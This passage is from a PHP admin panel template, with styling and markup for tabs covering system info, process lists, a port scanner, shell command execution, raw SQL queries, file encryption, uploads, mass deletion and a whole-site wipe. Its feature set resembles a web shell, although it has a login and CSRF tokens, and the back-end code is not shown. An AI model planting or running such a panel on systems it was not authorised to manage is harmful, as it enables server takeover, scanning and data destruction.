            padding: 25px;
            margin-top: 30px;
        }
        
        .file-manager-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #dee2e6;
        }
        
        .file-manager-controls {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .file-controls {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            gap: 20px;
            flex-wrap: wrap;
        }
        
        .search-controls {
            flex: 1;
            min-width: 300px;
        }
        
        .search-form {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .search-input {
            flex: 1;
            padding: 8px 12px;
            border: 2px solid #dee2e6;
            border-radius: 6px;
            font-size: 14px;
        }
        
        .sort-controls {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .sort-form {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .file-operations {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .operation-section {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .operation-section h4 {
            margin-top: 0;
            margin-bottom: 15px;
            color: #333;
        }
        
        .upload-form, .create-form {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .file-input {
            flex: 1;
            padding: 8px;
            border: 2px solid #dee2e6;
            border-radius: 6px;
        }
        
        .breadcrumb {
            background: white;
            padding: 10px 15px;
            border-radius: 6px;
            margin-bottom: 20px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .breadcrumb-item {
            color: #007bff;
            text-decoration: none;
            font-weight: 500;
        }
        
        .breadcrumb-item:hover {
            text-decoration: underline;
        }
        
        .file-list-container {
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
            margin: 0;
        }
        
        .file-table th {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 15px 10px;
            text-align: left;
            font-weight: 600;
            border: none;
        }
        
        .file-table td {
            padding: 12px 10px;
            border-bottom: 1px solid #f1f3f4;
            vertical-align: middle;
        }
        
        .file-table tr:hover {
            background: #f8f9fa;
        }
        
        .file-row.selected {
            background: #e3f2fd;
        }
        
        .file-name {
            font-weight: 500;
        }
        
        .file-link {
            color: #007bff;
            text-decoration: none;
            font-weight: 500;
        }
        
        .file-link:hover {
            text-decoration: underline;
        }
        
        .file-name-text {
            color: #333;
        }
        
        .file-size {
            color: #666;
            font-family: monospace;
        }
        
        .file-date {
            color: #666;
            font-size: 13px;
        }
        
        .file-permissions {
            font-family: monospace;
            font-size: 12px;
            color: #666;
        }
        
        .action-buttons {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }
        
        .btn-sm {
            padding: 4px 8px;
            font-size: 12px;
            border-radius: 4px;
        }
        
        /* Dark Theme Support */
        @media (prefers-color-scheme: dark) {
            body {
                background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
                color: #ecf0f1;
            }
            
            .container {
                background: #2c3e50;
                color: #ecf0f1;
            }
            
            .file-manager {
                background: #34495e;
            }
            
            .operation-section, .file-list-container, .breadcrumb {
                background: #2c3e50;
                color: #ecf0f1;
            }
            
            .file-table th {
                background: linear-gradient(45deg, #2c3e50, #34495e);
            }
            
            .file-table tr:hover {
                background: #34495e;
            }
            
            .search-input, .file-input {
                background: #34495e;
                border-color: #4a5f7a;
                color: #ecf0f1;
            }
            
            .search-input::placeholder {
                color: #95a5a6;
            }
        }
        
        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
        }
        
        .modal-content {
            background-color: white;
            margin: 5% auto;
            padding: 20px;
            border-radius: 8px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #dee2e6;
        }
        
        .close {
            color: #aaa;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .close:hover {
            color: #000;
        }
        
        /* CodeMirror Editor Styles */
        .CodeMirror {
            border: 1px solid #ddd;
            border-radius: 4px;
            height: 400px;
        }
        
        .CodeMirror-focused {
            border-color: #007bff;
        }
        
        /* File Editor Styles */
        .file-editor-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #dee2e6;
        }
        
        .editor-controls {
            display: flex;
            gap: 10px;
        }
        
        .editor-info {
            margin-top: 15px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 6px;
            color: #666;
        }
        /* Enhanced Features Styling */
        .feature-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .feature-card {
            background: linear-gradient(145deg, #f8f9fa, #e9ecef);
            border: 1px solid #dee2e6;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .feature-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 15px rgba(0,0,0,0.2);
        }
        
        .feature-card h4 {
            color: #495057;
            margin-bottom: 15px;
            font-size: 1.2em;
            border-bottom: 2px solid #007bff;
            padding-bottom: 8px;
        }
        
        .result-box {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            white-space: pre-wrap;
        }
        
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-online { background-color: #28a745; }
        .status-offline { background-color: #dc3545; }
        .status-warning { background-color: #ffc107; }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background-color: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #007bff, #0056b3);
            transition: width 0.3s ease;
        }
        
        .tab-navigation {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 2px solid #e9ecef;
            padding-bottom: 10px;
        }
        
        .tab-btn {
            background: linear-gradient(145deg, #f8f9fa, #e9ecef);
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 12px 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 500;
            color: #495057;
        }
        
        .tab-btn:hover {
            background: linear-gradient(145deg, #e9ecef, #dee2e6);
            transform: translateY(-2px);
        }
        
        .tab-btn.active {
            background: linear-gradient(145deg, #007bff, #0056b3);
            color: white;
            border-color: #0056b3;
        }
        
        .tab-content {
            display: none;
            animation: fadeIn 0.3s ease-in;
        }
        
        .tab-content.active {
            display: block;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .info-item {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #007bff;
        }
        
        .info-item strong {
            color: #495057;
            display: block;
            margin-bottom: 5px;
        }
        
        .info-item span {
            color: #6c757d;
            font-family: 'Courier New', monospace;
        }
        
        .alert {
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            border-left: 4px solid;
        }
        
        .alert-success {
            background-color: #d4edda;
            border-color: #28a745;
            color: #155724;
        }
        
        .alert-danger {
            background-color: #f8d7da;
            border-color: #dc3545;
            color: #721c24;
        }
        
        .alert-info {
            background-color: #d1ecf1;
            border-color: #17a2b8;
            color: #0c5460;
        }
        
        .alert-warning {
            background-color: #fff3cd;
            border-color: #ffc107;
            color: #856404;
        }
        
        @media (max-width: 768px) {
            .container { padding: 20px; }
            .header { flex-direction: column; gap: 15px; }
            .stats { grid-template-columns: 1fr; }
            .file-table { font-size: 12px; }
            .btn { padding: 8px 16px; font-size: 12px; }
            .tab-navigation { flex-direction: column; }
            .tab-btn { text-align: center; }
            .feature-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <?php if (!$_SESSION['authenticated']): ?>
        <!-- Login Form -->
        <div class="login-form">
            <h2>🔐 Admin Login</h2>
            <?php if ($auth_message): ?>
                <div class="message error"><?php echo $auth_message; ?></div>
            <?php endif; ?>
            <?php if (isset($_GET['timeout'])): ?>
                <div class="message error">Session expired! Please login again.</div>
            <?php endif; ?>
            <form method="POST">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" value="<?php echo htmlspecialchars($_POST['username'] ?? ''); ?>" required>
                </div>
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" name="login" class="btn btn-primary" style="width: 100%;">Login</button>
            </form>
        </div>
    <?php else: ?>
        <!-- Main Panel -->
        <div class="container">
            <div class="header">
                <h1>🚀 Site Management Panel</h1>
                <div class="auth-section">
                    <span>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?>!</span>
                    <span style="font-size: 12px; color: #666;">
                        Session: <?php echo date('H:i:s', $_SESSION['login_time']); ?>
                    </span>
                    <a href="?logout=1" class="btn btn-warning">Logout</a>
                </div>
            </div>
            
            <?php if ($deletion_message): ?>
                <div class="message <?php echo strpos($deletion_message, 'Error') !== false ? 'error' : 'success'; ?>">
                    <?php echo $deletion_message; ?>
                </div>
            <?php endif; ?>
            
            <?php if ($operation_message): ?>
                <div class="message <?php echo strpos($operation_message, 'successfully') !== false ? 'success' : 'error'; ?>">
                    <?php echo $operation_message; ?>
                </div>
            <?php endif; ?>
            
            <?php if ($feature_message): ?>
                <div class="message <?php echo strpos($feature_message, 'successfully') !== false || strpos($feature_message, 'Found') !== false ? 'success' : 'info'; ?>">
                    <pre style="white-space: pre-wrap; font-family: monospace; font-size: 12px;"><?php echo htmlspecialchars($feature_message); ?></pre>
                </div>
            <?php endif; ?>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number"><?php echo $site_stats['files']; ?></div>
                    <div class="stat-label">📄 Total Files</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?php echo $site_stats['directories']; ?></div>
                    <div class="stat-label">📁 Total Directories</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?php echo $site_stats['size']; ?></div>
                    <div class="stat-label">💾 Total Size</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?php echo $log_analysis['total_entries'] ?? 0; ?></div>
                    <div class="stat-label">📊 Log Entries</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?php echo count($processes); ?></div>
                    <div class="stat-label">⚙️ Running Processes</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?php echo count($network_interfaces); ?></div>
                    <div class="stat-label">🌐 Network Interfaces</div>
                </div>
            </div>
        
            <div class="danger-zone">
                <h3>⚠️ DANGER ZONE - Site Deletion</h3>
                <div class="warning">
                    <strong>Warning:</strong> This action will permanently delete ALL files and directories on the entire site. 
                    This action cannot be undone. Make sure you have a backup before proceeding.
                </div>
                
                <form method="POST" onsubmit="return confirmFinalDeletion()">
                    <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                    <div class="form-group">
                        <label>Type 'DELETE_ALL' to confirm:</label>
                        <input type="text" name="confirm_delete" placeholder="DELETE_ALL" required>
                    </div>
                    
                    <div class="form-group">
                        <label>Type 'YES_DELETE_EVERYTHING' for final confirmation:</label>
                        <input type="text" name="final_confirm" placeholder="YES_DELETE_EVERYTHING" required>
                    </div>
                    
                    <button type="submit" name="delete_site" class="btn btn-danger" onclick="return confirm('Are you absolutely sure you want to delete the entire site? This cannot be undone!')">
                        🗑️ DELETE ENTIRE SITE
                    </button>
                </form>
            </div>
        </div>
    
        <!-- Advanced Features Tabs -->
        <div class="container" style="margin-top: 30px;">
            <h2>🚀 Advanced Features</h2>
            
            <!-- Tab Navigation -->
            <div class="tab-navigation" style="margin-bottom: 20px;">
                <button class="tab-btn active" onclick="showTab('system')">🖥️ System Info</button>
                <button class="tab-btn" onclick="showTab('processes')">⚙️ Processes</button>
                <button class="tab-btn" onclick="showTab('network')">🌐 Network</button>
                <button class="tab-btn" onclick="showTab('database')">🗄️ Database</button>
                <button class="tab-btn" onclick="showTab('security')">🔒 Security</button>
                <button class="tab-btn" onclick="showTab('users')">👥 Users</button>
                <button class="tab-btn" onclick="showTab('filemanager')">📁 File Manager</button>
                <button class="tab-btn" onclick="showTab('monitoring')">📊 Monitoring</button>
                <button class="tab-btn" onclick="showTab('networktools')">🔧 Network Tools</button>
                <button class="tab-btn" onclick="showTab('advanced')">🛠️ Advanced</button>
                <button class="tab-btn" onclick="showTab('logs')">📋 Logs</button>
            </div>

            <!-- System Information Tab -->
            <div id="system-tab" class="tab-content active">
                <h3>🖥️ System Information</h3>
                <div class="responsive-grid">
                    <div class="info-card">
                        <h4>Operating System</h4>
                        <p><strong>OS:</strong> <?php echo $system_info['os']; ?></p>
                        <p><strong>Hostname:</strong> <?php echo $system_info['hostname']; ?></p>
                        <p><strong>Release:</strong> <?php echo $system_info['release']; ?></p>
                        <p><strong>Architecture:</strong> <?php echo $system_info['machine']; ?></p>
                    </div>
                    <div class="info-card">
                        <h4>PHP Information</h4>
                        <p><strong>Version:</strong> <?php echo $system_info['php_version']; ?></p>
                        <p><strong>SAPI:</strong> <?php echo $system_info['php_sapi']; ?></p>
                        <p><strong>Memory Limit:</strong> <?php echo $system_info['memory_limit']; ?></p>
                    </div>
                    <div class="info-card">
                        <h4>Memory Usage</h4>
                        <p><strong>Current:</strong> <?php echo $system_info['memory_usage']; ?></p>
                        <p><strong>Peak:</strong> <?php echo $system_info['memory_peak']; ?></p>
                    </div>
                    <div class="info-card">
                        <h4>Disk Space</h4>
                        <p><strong>Free:</strong> <?php echo $system_info['disk_free']; ?></p>
                        <p><strong>Total:</strong> <?php echo $system_info['disk_total']; ?></p>
                        <?php if (isset($system_info['load_average'])): ?>
                        <p><strong>Load Average:</strong> <?php echo $system_info['load_average']; ?></p>
                        <?php endif; ?>
                    </div>
                </div>
            </div>

            <!-- Processes Tab -->
            <div id="processes-tab" class="tab-content">
                <h3>⚙️ Running Processes</h3>
                <div style="overflow-x: auto; max-height: 400px;">
                    <table class="file-table">
                        <thead>
                            <tr>
                                <th>User</th>
                                <th>PID</th>
                                <th>CPU%</th>
                                <th>Memory%</th>
                                <th>VSZ</th>
                                <th>RSS</th>
                                <th>Status</th>
                                <th>Command</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach (array_slice($processes, 0, 50) as $process): ?>
                            <tr>
                                <td><?php echo htmlspecialchars($process['user']); ?></td>
                                <td><?php echo htmlspecialchars($process['pid']); ?></td>
                                <td><?php echo htmlspecialchars($process['cpu']); ?>%</td>
                                <td><?php echo htmlspecialchars($process['mem']); ?>%</td>
                                <td><?php echo htmlspecialchars($process['vsz']); ?></td>
                                <td><?php echo htmlspecialchars($process['rss']); ?></td>
                                <td><?php echo htmlspecialchars($process['stat']); ?></td>
                                <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">
                                    <?php echo htmlspecialchars(substr($process['command'], 0, 50)) . (strlen($process['command']) > 50 ? '...' : ''); ?>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Network Tab -->
            <div id="network-tab" class="tab-content">
                <h3>🌐 Network Tools</h3>
                
                <div class="responsive-grid">
                    <div class="info-card">
                        <h4>Network Interfaces</h4>
                        <?php foreach ($network_interfaces as $interface => $info): ?>
                        <p><strong><?php echo htmlspecialchars($interface); ?>:</strong> 
                           <?php echo isset($info['ip']) ? htmlspecialchars($info['ip']) : 'No IP'; ?></p>
                        <?php endforeach; ?>
                    </div>
                    
                    <div class="info-card">
                        <h4>Port Scanner</h4>
                        <form method="POST">
                    <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                    <div class="form-group">
                                <label>Target Host:</label>
                                <input type="text" name="scan_host" placeholder="127.0.0.1" required>
                    </div>
                            <div class="form-group">
                                <label>Ports (comma-separated):</label>
                                <input type="text" name="scan_ports_list" placeholder="22,80,443,3389" value="22,80,443,3389">
                            </div>
                            <button type="submit" name="scan_ports" class="btn btn-primary">🔍 Scan Ports</button>
                </form>
                    </div>
                </div>
            </div>

            <!-- Database Tab -->
            <div id="database-tab" class="tab-content">
                <h3>🗄️ Database Management</h3>
                
                <div class="responsive-grid">
                    <div class="info-card">
                        <h4>Database Tables</h4>
                        <?php if ($db_tables): ?>
                            <ul>
                                <?php foreach ($db_tables as $table): ?>
                                <li><?php echo htmlspecialchars($table[array_keys($table)[0]]); ?></li>
                                <?php endforeach; ?>
                            </ul>
                        <?php else: ?>
                            <p>No database connection or no tables found.</p>
                        <?php endif; ?>
                    </div>
                    
                    <div class="info-card">
                        <h4>Execute Query</h4>
                        <form method="POST">
                    <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                    <div class="form-group">
                                <label>SQL Query:</label>
                                <textarea name="db_query" rows="4" placeholder="SELECT * FROM users LIMIT 10;" required></textarea>
                    </div>
                            <button type="submit" class="btn btn-primary">▶️ Execute</button>
                </form>
                    </div>
                </div>
            </div>

            <!-- Security Tab -->
            <div id="security-tab" class="tab-content">
                <h3>🔒 Security Tools</h3>
                
                <div class="responsive-grid">
                    <div class="info-card">
                        <h4>Command Execution</h4>
                        <form method="POST">
                    <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                    <div class="form-group">
                                <label>Command:</label>
                                <input type="text" name="command" placeholder="ls -la" required>
                                <small>Allowed: ls, dir, pwd, whoami, ps, netstat, ifconfig, ipconfig, df, free, uptime, uname</small>
                    </div>
                            <button type="submit" name="execute_command" class="btn btn-primary">▶️ Execute</button>
                </form>
            </div>
            
                    <div class="info-card">
                        <h4>File Encryption</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>File Path:</label>
                                <input type="text" name="encrypt_file_path" placeholder="/path/to/file.txt" required>
                            </div>
                            <div class="form-group">
                                <label>Password:</label>
                                <input type="password" name="encrypt_password" required>
                            </div>
                            <button type="submit" name="encrypt_file" class="btn btn-warning">🔐 Encrypt</button>
                </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>File Decryption</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>Encrypted File Path:</label>
                                <input type="text" name="decrypt_file_path" placeholder="/path/to/file.txt.enc" required>
                            </div>
                            <div class="form-group">
                                <label>Password:</label>
                                <input type="password" name="decrypt_password" required>
                            </div>
                            <button type="submit" name="decrypt_file" class="btn btn-success">🔓 Decrypt</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>Backup System</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <button type="submit" name="create_backup" class="btn btn-primary">💾 Create Backup</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>IP Whitelist Management</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>IP Address:</label>
                                <input type="text" name="whitelist_ip" placeholder="192.168.1.1" required>
                            </div>
                            <button type="submit" name="add_whitelist" class="btn btn-success">➕ Add IP</button>
                            <button type="submit" name="remove_whitelist" class="btn btn-danger">➖ Remove IP</button>
                        </form>
                        <div style="max-height: 150px; overflow-y: auto; margin-top: 10px;">
                            <strong>Whitelisted IPs:</strong><br>
                            <?php foreach ($whitelisted_ips as $ip): ?>
                            <span class="badge badge-primary"><?php echo htmlspecialchars($ip); ?></span>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    
                    <div class="info-card">
                        <h4>Threat Detection</h4>
                        <?php if ($suspicious_activities): ?>
                        <div style="max-height: 200px; overflow-y: auto;">
                            <?php foreach ($suspicious_activities as $activity): ?>
                            <div class="alert alert-<?php echo $activity['severity'] === 'high' ? 'danger' : 'warning'; ?>">
                                <strong><?php echo ucfirst($activity['type']); ?>:</strong>
                                <?php if (isset($activity['ip'])): ?>
                                    IP: <?php echo htmlspecialchars($activity['ip']); ?>
                                <?php endif; ?>
                                <?php if (isset($activity['attempts'])): ?>
                                    (<?php echo $activity['attempts']; ?> attempts)
                                <?php endif; ?>
                            </div>
                            <?php endforeach; ?>
                        </div>
                        <?php else: ?>
                        <p class="alert alert-success">No suspicious activities detected.</p>
                        <?php endif; ?>
                    </div>
                    
                    <div class="info-card">
                        <h4>Security Logs</h4>
                        <?php if ($security_logs): ?>
                        <div style="max-height: 200px; overflow-y: auto; font-family: monospace; font-size: 11px;">
                            <?php foreach (array_slice($security_logs, 0, 20) as $log): ?>
                            <p><?php echo htmlspecialchars($log); ?></p>
                            <?php endforeach; ?>
                        </div>
                        <?php else: ?>
                        <p>No security logs available.</p>
                        <?php endif; ?>
                    </div>
                </div>
            </div>

            <!-- Logs Tab -->
            <div id="logs-tab" class="tab-content">
                <h3>📊 Log Analysis</h3>
                
                <div class="responsive-grid">
                    <div class="info-card">
                        <h4>Log Statistics</h4>
                        <p><strong>Total Entries:</strong> <?php echo $log_analysis['total_entries']; ?></p>
                        <p><strong>Login Attempts:</strong> <?php echo $log_analysis['login_attempts']; ?></p>
                        <p><strong>Failed Logins:</strong> <?php echo $log_analysis['failed_logins']; ?></p>
                        <p><strong>File Operations:</strong> <?php echo $log_analysis['file_operations']; ?></p>
                        <p><strong>Command Executions:</strong> <?php echo $log_analysis['command_executions']; ?></p>
                    </div>
                    
                    <div class="info-card">
                        <h4>Recent Actions</h4>
                        <div style="max-height: 300px; overflow-y: auto; background: #f8f9fa; padding: 10px; border-radius: 5px;">
                            <?php foreach (array_slice($log_analysis['recent_actions'], -20) as $log): ?>
                            <div style="margin-bottom: 5px; font-family: monospace; font-size: 12px;">
                                <?php echo htmlspecialchars($log); ?>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Users Tab -->
            <div id="users-tab" class="tab-content">
                <h3>👥 User Management</h3>
                
                <div class="responsive-grid">
                    <div class="info-card">
                        <h4>Create New User</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>Username:</label>
                                <input type="text" name="username" required>
                            </div>
                            <div class="form-group">
                                <label>Password:</label>
                                <input type="password" name="password" required>
                            </div>
                            <div class="form-group">
                                <label>Role:</label>
                                <select name="user_role">
                                    <option value="user">User</option>
                                    <option value="admin">Admin</option>
                                    <option value="moderator">Moderator</option>
                                </select>
                            </div>
                            <button type="submit" name="create_user" class="btn btn-primary">👤 Create User</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>User List</h4>
                        <div style="max-height: 300px; overflow-y: auto;">
                            <?php foreach ($users as $username => $user): ?>
                            <div style="padding: 10px; border: 1px solid #eee; margin: 5px 0; border-radius: 5px;">
                                <strong><?php echo htmlspecialchars($username); ?></strong>
                                <span style="color: <?php echo $user['active'] ? 'green' : 'red'; ?>;">
                                    (<?php echo $user['active'] ? 'Active' : 'Inactive'; ?>)
                </span>
                                <br>
                                <small>Role: <?php echo htmlspecialchars($user['role']); ?> | 
                                Created: <?php echo htmlspecialchars($user['created']); ?></small>
                                
                                <div style="margin-top: 5px;">
                                    <form method="POST" style="display: inline;">
                                        <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                                        <input type="hidden" name="username" value="<?php echo htmlspecialchars($username); ?>">
                                        <select name="new_role" style="font-size: 12px;">
                                            <option value="user" <?php echo $user['role'] === 'user' ? 'selected' : ''; ?>>User</option>
                                            <option value="admin" <?php echo $user['role'] === 'admin' ? 'selected' : ''; ?>>Admin</option>
                                            <option value="moderator" <?php echo $user['role'] === 'moderator' ? 'selected' : ''; ?>>Moderator</option>
                                        </select>
                                        <button type="submit" name="update_user_role" class="btn btn-warning" style="font-size: 12px; padding: 2px 8px;">Update Role</button>
                                    </form>
                                    
                                    <form method="POST" style="display: inline;">
                                        <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                                        <input type="hidden" name="username" value="<?php echo htmlspecialchars($username); ?>">
                                        <button type="submit" name="toggle_user_status" class="btn btn-<?php echo $user['active'] ? 'danger' : 'success'; ?>" style="font-size: 12px; padding: 2px 8px;">
                                            <?php echo $user['active'] ? 'Deactivate' : 'Activate'; ?>
                                        </button>
                                    </form>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Advanced Tools Tab -->
            <div id="advanced-tab" class="tab-content">
                <h3>🛠️ Advanced Tools</h3>
                
                <div class="responsive-grid">
                    <div class="info-card">
                        <h4>File Search</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>Search Term:</label>
                                <input type="text" name="search_term" placeholder="search term" required>
                            </div>
                            <button type="submit" name="search_files" class="btn btn-primary">🔍 Search Files</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>Mass File Operations</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>Operation:</label>
                                <select name="operation" required>
                                    <option value="delete">Delete Files</option>
                                    <option value="chmod">Change Permissions</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label>File Pattern:</label>
                                <input type="text" name="pattern" placeholder="*.tmp" required>
                            </div>
                            <button type="submit" name="mass_operation" class="btn btn-danger">⚡ Execute</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>Email Notifications</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>To:</label>
                                <input type="email" name="email_to" placeholder="admin@example.com" value="admin@example.com">
                            </div>
                            <div class="form-group">
                                <label>Subject:</label>
                                <input type="text" name="email_subject" placeholder="Notification Subject" required>
                            </div>
                            <div class="form-group">
                                <label>Message:</label>
                                <textarea name="email_message" rows="3" required></textarea>
                            </div>
                            <button type="submit" name="send_notification" class="btn btn-primary">📧 Send</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>Real-time Stats</h4>
                        <p><strong>Memory Usage:</strong> <?php echo formatBytes($real_time_stats['memory_usage']); ?></p>
                        <p><strong>Memory Peak:</strong> <?php echo formatBytes($real_time_stats['memory_peak']); ?></p>
                        <p><strong>Disk Free:</strong> <?php echo formatBytes($real_time_stats['disk_free']); ?></p>
                        <?php if ($real_time_stats['load_average']): ?>
                        <p><strong>Load Average:</strong> <?php echo implode(', ', $real_time_stats['load_average']); ?></p>
                        <?php endif; ?>
                        <?php if ($real_time_stats['uptime']): ?>
                        <p><strong>Uptime:</strong> <?php echo htmlspecialchars($real_time_stats['uptime']); ?></p>
                        <?php endif; ?>
                        <button onclick="location.reload()" class="btn btn-primary">🔄 Refresh</button>
                    </div>
                </div>
            </div>

            <!-- File Manager Tab -->
            <div id="filemanager-tab" class="tab-content">
                <h3>📁 Advanced File Manager</h3>
                <div class="responsive-grid">
                    <div class="info-card">
                        <h4>File Operations</h4>
                        <form method="POST" enctype="multipart/form-data">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>Upload File:</label>
                                <input type="file" name="upload_file" class="form-control">
                            </div>
                            <div class="form-group">
                                <label>Upload to:</label>
                                <input type="text" name="upload_path" value="." placeholder="Directory path">
                            </div>
                            <button type="submit" name="upload_file_action" class="btn btn-primary">📤 Upload</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>File Search</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>Search Pattern:</label>
                                <input type="text" name="file_search_pattern" placeholder="*.php" required>
                            </div>
                            <div class="form-group">
                                <label>Directory:</label>
                                <input type="text" name="file_search_dir" value="." placeholder="Search directory">
                            </div>
                            <button type="submit" name="file_search_action" class="btn btn-primary">🔍 Search</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>Current Directory Info</h4>
                        <?php if ($file_manager_data): ?>
                        <p><strong>Current Path:</strong> <?php echo htmlspecialchars($file_manager_data['current_path']); ?></p>
                        <p><strong>Directories:</strong> <?php echo count($file_manager_data['directories']); ?></p>
                        <p><strong>Files:</strong> <?php echo count($file_manager_data['files']); ?></p>
                        <a href="?fm_path=<?php echo urlencode($file_manager_data['parent_path']); ?>" class="btn btn-secondary">⬆️ Parent Directory</a>
                        <?php endif; ?>
                    </div>
                </div>
            </div>

            <!-- Monitoring Tab -->
            <div id="monitoring-tab" class="tab-content">
                <h3>📊 Advanced System Monitoring</h3>
                <div class="responsive-grid">
                    <div class="info-card">
                        <h4>Detailed System Info</h4>
                        <?php if ($detailed_system_info): ?>
                        <p><strong>OS:</strong> <?php echo htmlspecialchars($detailed_system_info['os']); ?></p>
                        <p><strong>Hostname:</strong> <?php echo htmlspecialchars($detailed_system_info['hostname']); ?></p>
